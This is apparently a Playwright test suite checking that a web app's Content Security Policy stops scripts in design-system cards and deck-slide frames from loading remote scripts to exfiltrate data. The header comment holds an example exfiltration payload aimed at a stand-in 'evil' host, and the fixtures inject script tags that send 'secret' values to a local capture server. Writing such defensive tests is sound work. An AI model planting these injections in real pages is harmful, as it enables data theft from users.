// md-exfil T11 (ADR-9): the enforced CSP carries `default-src 'self'` and
// `script-src 'self' 'unsafe-inline'`. A script that runs inside a srcdoc frame
// (a design-system card, or a deck slide if the sanitizer were ever bypassed)
// can no longer load a remote script, which is a no-click egress channel
// (`<script src=https://evil/x.js?d=<data>>`). The "attacker host" is a
// loopback listener this spec starts and stops; it COUNTS requests. Under
// CSP_EGRESS=report (a second fixture server, same build) the canary IS hit.
// Own file on purpose: T7 edits egress.spec.mjs / csp-report-only.spec.mjs.
import http from 'node:http'
import { test, expect } from '@playwright/test'
import { loadFixtures, newVariantContext, SCREENS } from './lib.mjs'
import { startFixtureServer } from './fixture-server.mjs'

const fx = loadFixtures()
const { ids } = fx

// every frame reports its securitypolicyviolation events to the top window
const VIOLATION_PROBE = `(() => {
  const push = (e) => {
    try { (window.top.__cspV = window.top.__cspV || []).push({ directive: e.effectiveDirective, disposition: e.disposition }) } catch {}
  }
  document.addEventListener('securitypolicyviolation', push, true)
})()`

async function startCapture() {
  const hits = []
  const server = http.createServer((req, res) => {
    hits.push(req.url)
    res.writeHead(200, { 'content-type': 'text/javascript', 'access-control-allow-origin': '*' })
    res.end('window.__remoteScriptRan = 1')
  })
  await new Promise((r) => server.listen(0, '127.0.0.1', r))
  return { hits, port: server.address().port, close: () => new Promise((r) => (server.close(() => r()), server.closeAllConnections())) }
}

// a DS card whose inline script injects a remote <script> (what an uploaded kit can do)
const dsCard = (port) =>
  '<section style="width:1280px;height:720px;background:#123;color:#fff;font:600 64px system-ui;padding:80px">' +
  '<span id="ds-probe">Specimen slide</span>' +
  `<script>var s=document.createElement("script");s.src="http://127.0.0.1:${port}/ds.js?d=secret";document.body.appendChild(s);document.getElementById("ds-probe").dataset.ran="1"</script></section>`

// a slide that carries the same payload as a static tag: what a sanitizer bypass would leave in the stored HTML
const slideHtml = (port, i) =>
  `<section style="width:1280px;height:720px;background:#0B2026;color:#fff;padding:96px;box-sizing:border-box"><h1 id="t11-title">Revenue grew ${i}</h1><script src="http://127.0.0.1:${port}/slide.js?d=slide-secret"></script></section>`

async function openOn(browser, base) {
  const ctx = await newVariantContext(browser, { theme: 'dark', mobile: false })
  await ctx.addInitScript(VIOLATION_PROBE)
  const page = await ctx.newPage()
  const errors = []
  page.on('pageerror', (e) => errors.push(String(e)))
  return { ctx, page, errors, base }
}

async function showDsCard(page, base, port) {
  await page.route('**/api/deck-templates', (route) =>
    route.fulfill({ contentType: 'application/json', body: JSON.stringify({ templates: [{ id: 501, name: 'Probe DS', scope: 'user', dsCards: [{ group: 'Templates', html: dsCard(port) }], primaryColor: '#123' }] }) })
  )
  await page.goto(`${base}/#/chat`)
  await page.locator('textarea').first().waitFor()
  await page.locator('button[title="Settings"]').first().click()
  await page.getByRole('button', { name: 'Design system', exact: true }).first().click()
  const frame = page.frameLocator('iframe[title="Probe DS"]')
  await expect(frame.getByText('Specimen slide')).toBeVisible({ timeout: 15_000 })
  // the card's own inline script ran (inline stays allowed)
  await expect(frame.locator('#ds-probe')).toHaveAttribute('data-ran', '1')
}

async function showSlide(page, base, port) {
  const deck = JSON.parse(fx.routes['GET /api/decks/9'].body)
  deck.deck.slides = deck.deck.slides.map((_, i) => slideHtml(port, i))
  await page.route('**/api/decks/9', (r) => r.fulfill({ contentType: 'application/json', body: JSON.stringify(deck) }))
  const msgs = JSON.parse(fx.routes[`GET /api/sessions/${ids.s1}/messages`].body)
  for (const m of msgs.messages) for (const b of m.blocks || []) if (b.type === 'deck-html') b.slides = b.slides.map((_, i) => slideHtml(port, i))
  await page.route(`**/api/sessions/${ids.s1}/messages`, (r) => r.fulfill({ contentType: 'application/json', body: JSON.stringify(msgs) }))
  await SCREENS['deck-studio'](page, base, ids)
  await expect
    .poll(async () => {
      for (const f of page.frames()) if (f !== page.mainFrame() && (await f.locator('#t11-title').count().catch(() => 0))) return true
      return false
    }, { timeout: 15_000 })
    .toBe(true)
}

const scriptViolations = (page, disposition) =>
  page.evaluate((d) => (window.__cspV || []).filter((v) => v.directive.startsWith('script-src') && v.disposition === d), disposition)

async function reports(base) {
  return (await fetch(`${base}/__fixtures/csp-reports`)).json()
}

test('S1 (header): enforce carries default-src and script-src with no origin, blob:, unsafe-eval or *', async ({ request, baseURL }) => {
  const csp = (await request.get(`${baseURL}/`)).headers()['content-security-policy']
  expect(csp).toContain("default-src 'self'; script-src 'self' 'unsafe-inline'; img-src")
  // the fixture server runs with an admin-allowlisted origin: it opens img/font/style only
  expect(csp).toMatch(/img-src[^;]*cdn\.allowed\.example/)
  for (const d of ['default-src', 'script-src']) expect(csp.match(new RegExp(`(?:^|; )${d} ([^;]*)`))[1]).not.toMatch(/https?:|blob:|unsafe-eval|\*|allowed\.example/)
})

test('S2 (DS card): an inline script that injects a remote <script> gets 0 hits and a script-src violation report', async ({ browser, baseURL }) => {
  const cap = await startCapture()
  const { ctx, page, errors } = await openOn(browser, baseURL)
  await showDsCard(page, baseURL, cap.port)
  await expect.poll(() => scriptViolations(page, 'enforce'), { timeout: 10_000 }).not.toEqual([])
  expect(cap.hits).toEqual([])
  // the report reached the server (sink for csp_violation)
  await expect.poll(async () => (await reports(baseURL)).some((r) => String(r.directive).startsWith('script-src') && r.disposition === 'enforce'), { timeout: 10_000 }).toBe(true)
  expect(errors).toEqual([])
  await ctx.close()
  await cap.close()
})

test('S2 (slide, sanitizer bypassed): a stored <script src> in a slide gets 0 hits and a script-src violation', async ({ browser, baseURL }) => {
  const cap = await startCapture()
  const { ctx, page } = await openOn(browser, baseURL)
  await showSlide(page, baseURL, cap.port)
  await expect.poll(() => scriptViolations(page, 'enforce'), { timeout: 10_000 }).not.toEqual([])
  expect(cap.hits).toEqual([])
  await ctx.close()
  await cap.close()
})

test('S2 (CSP_EGRESS=report): the same DS card and slide DO reach the canary, and nothing is enforced', async ({ browser }) => {
  const prev = process.env.CSP_EGRESS
  process.env.CSP_EGRESS = 'report' // read once when the header middleware is built
  const rep = await startFixtureServer({ port: 0 })
  if (prev === undefined) delete process.env.CSP_EGRESS
  else process.env.CSP_EGRESS = prev
  const cap = await startCapture()
  try {
    const csp = (await (await fetch(`${rep.url}/`)).headers.get('content-security-policy')) || ''
    expect(csp).not.toMatch(/default-src|script-src/)

    const a = await openOn(browser, rep.url)
    await showDsCard(a.page, rep.url, cap.port)
    await expect.poll(() => cap.hits.filter((u) => u.startsWith('/ds.js')).length, { timeout: 10_000 }).toBeGreaterThanOrEqual(1)
    expect(await scriptViolations(a.page, 'enforce')).toEqual([])
    await a.ctx.close()

    const b = await openOn(browser, rep.url)
    await showSlide(b.page, rep.url, cap.port)
    await expect.poll(() => cap.hits.filter((u) => u.startsWith('/slide.js')).length, { timeout: 10_000 }).toBeGreaterThanOrEqual(1)
    expect(await scriptViolations(b.page, 'enforce')).toEqual([])
    await b.ctx.close()
  } finally {
    await rep.close()
    await cap.close()
  }
})

test('S3/S4: shell, deck studio and the DS settings raise 0 enforced script-src violations (inline editor runtime still runs)', async ({ browser, baseURL }) => {
  const { ctx, page, errors } = await openOn(browser, baseURL)
  await SCREENS['deck-studio'](page, baseURL, ids)
  await page.getByTitle('Edit the slide directly: click any element to adjust it').click()
  await page.getByRole('tab', { name: 'Layers' }).click()
  await expect(page.getByText('Elements').first()).toBeVisible() // the editor runtime's element tree arrived over postMessage
  await page.goto(`${baseURL}/#/chat`)
  await page.locator('textarea').first().waitFor()
  await page.locator('button[title="Settings"]').first().click()
  await page.getByRole('button', { name: 'Design system', exact: true }).first().click()
  expect(await page.evaluate(() => (window.__cspV || []).filter((v) => v.disposition === 'enforce'))).toEqual([])
  expect(errors).toEqual([])
  await ctx.close()
})
